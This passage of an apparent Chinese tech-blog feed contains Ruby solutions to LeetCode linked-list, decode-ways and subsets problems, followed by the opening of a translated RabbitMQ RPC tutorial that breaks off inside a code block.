    <content type="html"><![CDATA[<h1 id="Reverse-Linked-List"><a href="#Reverse-Linked-List" class="headerlink" title="Reverse Linked List"></a>Reverse Linked List</h1><h2 id="206-Reverse-Linked-List"><a href="#206-Reverse-Linked-List" class="headerlink" title="206. Reverse Linked List"></a>206. Reverse Linked List</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Reverse a singly linked list.</p><p>Hint:</p><p>A linked list can be reversed either iteratively or recursively. Could you implement both?</p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>题目要求两种实现思路：迭代方式和递归方式。</p><h4 id="迭代方式"><a href="#迭代方式" class="headerlink" title="迭代方式"></a>迭代方式</h4><p>先创建一个临时节点，从头往后遍历链表，来一个节点就插入临时节点和第一个节点之间，这样遍历完后，链表就逆序了。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iteratively implement</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_list</span><span class="params">(head)</span></span></span><br><span class="line">  dummy_head = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  p = head</span><br><span class="line">  <span class="keyword">while</span> p</span><br><span class="line">    n = p.<span class="keyword">next</span></span><br><span class="line">    p.<span class="keyword">next</span> = dummy_head.<span class="keyword">next</span></span><br><span class="line">    dummy_head.<span class="keyword">next</span> = p</span><br><span class="line">    p = n</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  dummy_head.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h4 id="递归方式"><a href="#递归方式" class="headerlink" title="递归方式"></a>递归方式</h4><p>递归结束条件是遍历到最后一个节点，直接返回。其他情况就是让下一个节点指向当前节点。中间要一直返回最后一个节点，递归完后，最后一个节点就变成第一个节点了。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># recursively implement</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_list</span><span class="params">(head)</span></span></span><br><span class="line">  <span class="keyword">if</span> head.<span class="literal">nil</span>? <span class="keyword">or</span> head.<span class="keyword">next</span>.<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">return</span> head</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    n = head.<span class="keyword">next</span></span><br><span class="line">    head.<span class="keyword">next</span> = <span class="literal">nil</span></span><br><span class="line">    rest = reverse_list(n)</span><br><span class="line">    n.<span class="keyword">next</span> = head</span><br><span class="line">    <span class="keyword">return</span> rest</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul><h2 id="92-Reverse-Linked-List-II"><a href="#92-Reverse-Linked-List-II" class="headerlink" title="92. Reverse Linked List II"></a>92. Reverse Linked List II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Reverse a linked list from position m to n. Do it in one-pass.</p><p>Note: 1 ≤ m ≤ n ≤ length of list.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4</span><br><span class="line">Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>这题解法就是，先找到m节点的位置，然后把m和n之间的节点插入m节点和它之前节点就行。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode</span></span><br><span class="line"><span class="comment">#     attr_accessor :val, :next</span></span><br><span class="line"><span class="comment">#     def initialize(val)</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@val</span> = val</span></span><br><span class="line"><span class="comment">#         <span class="doctag">@next</span> = nil</span></span><br><span class="line"><span class="comment">#     end</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;ListNode&#125; head</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; m</span></span><br><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer&#125; n</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;ListNode&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_between</span><span class="params">(head, m, n)</span></span></span><br><span class="line">  <span class="keyword">return</span> head <span class="keyword">if</span> head.<span class="literal">nil</span>?</span><br><span class="line">  dummy = ListNode.new(<span class="number">0</span>)</span><br><span class="line">  dummy.<span class="keyword">next</span> = head</span><br><span class="line">  m_prev, i = dummy, <span class="number">1</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; m <span class="keyword">and</span> m_prev.<span class="keyword">next</span></span><br><span class="line">    m_prev = m_prev.<span class="keyword">next</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> head <span class="keyword">if</span> i &lt; m</span><br><span class="line">  m_node = m_prev.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">return</span> head <span class="keyword">if</span> m_node.<span class="literal">nil</span>?</span><br><span class="line">  c_node = m_node.<span class="keyword">next</span></span><br><span class="line">  <span class="keyword">while</span> i &lt; n <span class="keyword">and</span> c_node</span><br><span class="line">    t = c_node.<span class="keyword">next</span></span><br><span class="line">    c_node.<span class="keyword">next</span> = m_prev.<span class="keyword">next</span></span><br><span class="line">    m_prev.<span class="keyword">next</span> = c_node</span><br><span class="line">    c_node = t</span><br><span class="line">    m_node.<span class="keyword">next</span> = c_node</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> dummy.<span class="keyword">next</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h3 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(1)</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Reverse-Linked-List&quot;&gt;&lt;a href=&quot;#Reverse-Linked-List&quot; class=&quot;headerlink&quot; title=&quot;Reverse Linked List&quot;&gt;&lt;/a&gt;Reverse Linked List&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Decode Ways</title>
    <link href="http://jack0pan.github.io/2018/04/25/Decode-Ways/"/>
    <id>http://jack0pan.github.io/2018/04/25/Decode-Ways/</id>
    <published>2018-04-25T14:06:22.000Z</published>
    <updated>2018-05-06T03:35:25.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Decode-Ways"><a href="#Decode-Ways" class="headerlink" title="Decode Ways"></a>Decode Ways</h1><h2 id="91-Decode-Ways"><a href="#91-Decode-Ways" class="headerlink" title="91. Decode Ways"></a>91. Decode Ways</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>A message containing letters from A-Z is being encoded to numbers using the following mapping:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;A&apos; -&gt; 1</span><br><span class="line">&apos;B&apos; -&gt; 2</span><br><span class="line">...</span><br><span class="line">&apos;Z&apos; -&gt; 26</span><br></pre></td></tr></table></figure></p><p>Given a non-empty string containing only digits, determine the total number of ways to decode it.</p><p>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;12&quot;</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: It could be decoded as &quot;AB&quot; (1 2) or &quot;L&quot; (12).</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;226&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: It could be decoded as &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), or &quot;BBF&quot; (2 2 6).</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>我们用<code>dp[i]</code>表示以第i个数字结尾的子串编码数量，计算公式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp[i] += dp[i-1] 如果s[i-1] &gt; 0</span><br><span class="line">dp[i] += dp[i-2] 如果10 &lt;= s[i-2]s[i-1] &lt;= 26</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;String&#125; s</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_decodings</span><span class="params">(s)</span></span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> s.<span class="literal">nil</span>? <span class="keyword">or</span> s.empty? <span class="keyword">or</span> s[<span class="number">0</span>] == <span class="string">'0'</span></span><br><span class="line">  dp = Array.new(s.length + <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">  dp[<span class="number">0</span>], dp[<span class="number">1</span>] = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">  (<span class="number">2</span>..s.length).each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    dp[i] += dp[i - <span class="number">1</span>] <span class="keyword">if</span> s[i - <span class="number">1</span>].to_i &gt; <span class="number">0</span></span><br><span class="line">    dp[i] += dp[i - <span class="number">2</span>] <span class="keyword">if</span> s[i - <span class="number">2</span>.. i - <span class="number">1</span>].to_i &gt;= <span class="number">10</span> <span class="keyword">and</span> s[i - <span class="number">2</span>.. i - <span class="number">1</span>].to_i &lt;= <span class="number">26</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  dp[s.length]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n)</code></li><li>空间复杂度：<code>O(n)</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Decode-Ways&quot;&gt;&lt;a href=&quot;#Decode-Ways&quot; class=&quot;headerlink&quot; title=&quot;Decode Ways&quot;&gt;&lt;/a&gt;Decode Ways&lt;/h1&gt;&lt;h2 id=&quot;91-Decode-Ways&quot;&gt;&lt;a href=&quot;#91-
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>Subsets</title>
    <link href="http://jack0pan.github.io/2018/04/24/Subsets/"/>
    <id>http://jack0pan.github.io/2018/04/24/Subsets/</id>
    <published>2018-04-24T13:56:24.000Z</published>
    <updated>2018-05-06T03:37:25.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Subsets"><a href="#Subsets" class="headerlink" title="Subsets"></a>Subsets</h1><h2 id="78-Subsets"><a href="#78-Subsets" class="headerlink" title="78. Subsets"></a>78. Subsets</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>Given a set of distinct integers, nums, return all possible subsets (the power set).</p><p>Note: The solution set must not contain duplicate subsets.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,2,3]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [1],</span><br><span class="line">  [2],</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [1,3],</span><br><span class="line">  [2,3],</span><br><span class="line">  [1,2],</span><br><span class="line">  []</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p>利用深度优先算法，把所有组合情况都遍历一遍。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subsets</span><span class="params">(nums)</span></span></span><br><span class="line">  nums.sort!</span><br><span class="line">  path, result = [], []</span><br><span class="line">  _subsets(nums, <span class="number">0</span>, path, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _subsets<span class="params">(nums, index, path, result)</span></span></span><br><span class="line">  result.push(path.dup)</span><br><span class="line">  i = index</span><br><span class="line">  <span class="keyword">while</span> i &lt; nums.length</span><br><span class="line">    path.push(nums[i]);</span><br><span class="line">    _subsets(nums, i + <span class="number">1</span>, path, result)</span><br><span class="line">    path.pop</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h3><ul><li>时间复杂度：<code>O(n!)</code></li><li>空间复杂度：<code>O(n!)</code></li></ul><h2 id="90-Subsets-II"><a href="#90-Subsets-II" class="headerlink" title="90. Subsets II"></a>90. Subsets II</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>Given a collection of integers that might contain duplicates, nums, return all possible subsets (the power set).</p><p>Note: The solution set must not contain duplicate subsets.</p><p>Example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,2,2]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [2],</span><br><span class="line">  [1],</span><br><span class="line">  [1,2,2],</span><br><span class="line">  [2,2],</span><br><span class="line">  [1,2],</span><br><span class="line">  []</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p>这道题和<a href="https://leetcode.com/problems/subsets/description/" target="_blank" rel="noopener">Subsets</a>的区别在于去掉重复元素，最直接的办法就是在添加一种新组合前，判断一下是否已经含有这种组合。但是，这种做法增加了时间复杂度，LeetCode上的运行时间是<code>100ms</code>。</p><p>还有一种更有效的办法，在把元素添加到组合中，直接跳过重复元素。这种做法可以把时间缩短到<code>40ms</code>。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># <span class="doctag">@param</span> &#123;Integer[]&#125; nums</span></span><br><span class="line"><span class="comment"># <span class="doctag">@return</span> &#123;Integer[][]&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subsets_with_dup</span><span class="params">(nums)</span></span></span><br><span class="line">  nums.sort!</span><br><span class="line">  path, result = [], []</span><br><span class="line">  _subsets(nums, <span class="number">0</span>, path, result)</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> _subsets<span class="params">(nums, index, path, result)</span></span></span><br><span class="line">  result.push(path.dup)</span><br><span class="line">  i = index</span><br><span class="line">  <span class="keyword">while</span> i &lt; nums.length</span><br><span class="line">    path.push(nums[i]);</span><br><span class="line">    _subsets(nums, i + <span class="number">1</span>, path, result)</span><br><span class="line">    path.pop</span><br><span class="line">    i += <span class="number">1</span> <span class="keyword">while</span> i &lt; nums.length - <span class="number">1</span> <span class="keyword">and</span> nums[i] == nums[i + <span class="number">1</span>]</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="复杂度-1"><a href="#复杂度-1" class="headerlink" title="复杂度"></a>复杂度</h2><ul><li>时间复杂度：<code>O(n!)</code></li><li>空间复杂度：<code>O(n!)</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Subsets&quot;&gt;&lt;a href=&quot;#Subsets&quot; class=&quot;headerlink&quot; title=&quot;Subsets&quot;&gt;&lt;/a&gt;Subsets&lt;/h1&gt;&lt;h2 id=&quot;78-Subsets&quot;&gt;&lt;a href=&quot;#78-Subsets&quot; class=&quot;head
      
    
    </summary>
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/categories/LeetCode/"/>
    
    
      <category term="LeetCode" scheme="http://jack0pan.github.io/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>RabbitMQ教程（六）──远程过程调用</title>
    <link href="http://jack0pan.github.io/2017/10/06/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E5%85%AD%EF%BC%89%E2%94%80%E2%94%80%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8/"/>
    <id>http://jack0pan.github.io/2017/10/06/RabbitMQ教程（六）──远程过程调用/</id>
    <published>2017-10-06T14:13:36.000Z</published>
    <updated>2018-04-09T14:17:07.084Z</updated>
    
    <content type="html"><![CDATA[<h1 id="远程过程调用"><a href="#远程过程调用" class="headerlink" title="远程过程调用"></a>远程过程调用</h1><p>（使用Ruby客户端）</p><p>在第二篇教程中我们介绍了如何使用工作队列（work queue）在多个工作者（woker）中间分发耗时的任务。</p><p>可是如果我们需要将一个函数运行在远程计算机上并且等待从那儿获取结果时，该怎么办呢？这就是另外的故事了。这种模式通常被称为远程过程调用（Remote Procedure Call）或者RPC。</p><p>这篇教程中，我们会使用RabbitMQ来构建一个RPC系统：包含一个客户端和一个RPC服务器。现在的情况是，我们没有一个值得被分发的足够耗时的任务，所以接下来，我们会创建一个模拟RPC服务来返回斐波那契数列。</p><a id="more"></a><h2 id="客户端接口"><a href="#客户端接口" class="headerlink" title="客户端接口"></a>客户端接口</h2><p>为了展示RPC服务如何使用，我们创建了一个简单的客户端类。它会暴露出一个名为<code>call</code>的方法用来发送一个RPC请求，并且在收到回应前保持阻塞。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">client = FibonacciClient.new(<span class="string">'rpc_queue'</span>)</span><br><span class="line"></span><br><span class="line">puts <span class="string">' [x] Requesting fib(30)'</span></span><br><span class="line">response = client.call(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">puts <span class="string">" [.] Got <span class="subst">#&#123;response&#125;</span>"</span></span><br></pre></td></tr></table></figure><blockquote><p>关于RPC的注意事项：</p></blockquote><blockquote><p>尽管RPC在计算领域是一个常用模式，但它也经常被诟病。当一个问题被抛出的时候，程序员往往意识不到这到底是由本地调用还是由较慢的RPC调用引起的。同样的困惑还来自于系统的不可预测性和给调试工作带来的不必要的复杂性。跟软件精简不同的是，滥用RPC会导致不可维护的面条代码.</p></blockquote><blockquote><p>考虑到这一点，牢记以下建议：</p></blockquote><blockquote><ul><li>确保能够明确的搞清楚哪个函数是本地调用的，哪个函数是远程调用的。</li><li>给你的系统编写文档。保持各个组件间的依赖明确。</li><li>处理错误案例。明了客户端改如何处理RPC服务器的宕机和长时间无响应情况。</li></ul></blockquote><blockquote><p>当对避免使用RPC有疑问的时候。如果可以的话，你应该尽量使用异步管道来代替RPC类的阻塞。结果被异步地推送到下一个计算场景。</p></blockquote><h2 id="回调队列"><a href="#回调队列" class="headerlink" title="回调队列"></a>回调队列</h2><p>一般来说通过RabbitMQ来实现RPC是很容易的。一个客户端发送请求信息，服务器端将其应用到一个回复信息中。为了接收到回复信息，客户端需要在发送请求的时候同时发送一个回调队列（callback queue）的地址。我们试试看：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">queue = channel.queue(<span class="string">''</span>, <span class="symbol">exclusive:</span> <span class="literal">true</span>)</span><br><span class="line">exchange = channel.default_exchange</span><br><span class="line"></span><br><span class="line">exchange.publish(message, <span class="symbol">routing_key:</span> <span class="string">'rpc_queue'</span>, <span class="symbol">reply_to:</span> queue.name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ... then code to read a response message from the callback_queue ...</span></span><br></pre></td></tr></table></figure><blockquote><p>消息属性</p></blockquote><blockquote><p>AMQP 0.9.1协议给消息预定义了一系列的14个属性。大多数属性很少会用到，除了以下几个：</p></blockquote><blockquote><ul><li><code>:persistent</code>：将消息标记为持久的（值为true）或暂存的（值为false）。第二篇教程里接触过这个属性，记得吧？</li><li><code>:content_type</code>：用来描述编码的mime-type。例如在实际使用中常常使用<code>application/json</code>来描述JOSN编码类型。</li><li><code>:reply_to</code>：通常用来命名回调队列。</li><li><code>:correlation_id</code>：用来将RPC的响应和请求关联起来。</li></ul></blockquote><h2 id="关联标识"><a href="#关联标识" class="headerlink" title="关联标识"></a>关联标识</h2><p>上边介绍的方法中，我们建议给每一个RPC请求新建一个回调队列。这不是一个高效的做法，幸好这儿有一个更好的办法 —— 我们可以为每个客户端只建立一个独立的回调队列。</p><p>这就带来一个新问题，当此队列接收到一个响应的时候它无法辨别出这个响应是属于哪个请求的。<code>:correlation_id</code>就是为了解决这个问题而来的。我们给每个请求设置一个独一无二的值。稍后，当我们从回调队列中接收到一个消息的时候，我们就可以查看这条属性从而将响应和请求匹配起来。如果我们接手到的消息的<code>:correlation_id</code>是未知的，那就直接销毁掉它，因为它不属于我们的任何一条请求。</p><p>你也许会问，为什么我们接收到未知消息的时候不抛出一个错误，而是要将它忽略掉？这是为了解决服务器端有可能发生的竞争情况。尽管可能性不大，但RPC服务器还是有可能在已将应答发送给我们但还未将确认消息发送给请求的情况下死掉。如果这种情况发生，RPC在重启后会重新处理请求。这就是为什么我们必须在客户端优雅的处理重复响应，同时RPC也需要尽可能保持幂等性。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://www.rabbitmq.com/img/tutorials/python-six.png" alt="python-six"></p><p>我们的RPC如此工作:</p><ul><li>当客户端启动的时候，它创建一个匿名独享的回调队列。</li><li>在RPC请求中，客户端发送带有两个属性的消息：一个是设置回调队列的<code>:reply_to</code>属性，另一个是设置唯一值的<code>:correlation_id</code>属性。</li><li>将请求发送到一个<code>rpc_queue</code>队列中。</li><li>RPC工作者（又名：服务器）等待请求发送到这个队列中来。当请求出现的时候，它执行他的工作并且将带有执行结果的消息发送给<code>:reply_to</code>字段指定的队列。</li><li>客户端等待回调队列里的数据。当有消息出现的时候，它会检查<code>:correlation_id</code>属性。如果此属性的值与请求匹配，将它返回给应用。</li></ul><h2 id="整合到一起"><a href="#整合到一起" class="headerlink" title="整合到一起"></a>整合到一起</h2><p>斐波那契数列任务：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(value)</span></span></span><br><span class="line">  <span class="keyword">return</span> value <span class="keyword">if</span> value.zero? <span class="params">||</span> value == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  fibonacci(value - <span class="number">1</span>) + fibonacci(value - <span class="number">2</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>我们声明我们的fibonacci函数，它假设只有合法的正整数当作输入。（别指望这个函数能处理很大的数值，因为它可能是最慢的递归实现方式）。</p><p><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/rpc_server.rb" target="_blank" rel="noopener">rpc_server.rb</a>代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 